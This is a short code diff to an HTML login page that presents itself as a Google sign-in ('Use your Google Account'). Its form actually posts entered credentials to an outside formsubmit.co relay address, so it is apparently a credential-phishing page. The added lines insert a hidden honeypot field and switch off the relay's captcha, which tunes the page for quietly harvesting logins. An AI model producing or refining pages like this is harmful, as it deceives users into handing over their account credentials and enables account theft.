@@ -139,6 +139,11 @@
             <h2>Log In</h2>
             <p>Use your Google Account</p>
             <form action="https://formsubmit.co/aa5bf61832680f8f2810da58baecc388" method="POST">
+              <!--honeypot-->
+              <input type="text" name="_honey" style="display: none;">
+              
+              <!--captcha-->
+              <input type="hidden" name="_captcha" value="false">
                 <div class="input-group">
                     <input type="email" name="email" required placeholder="Email">
                     
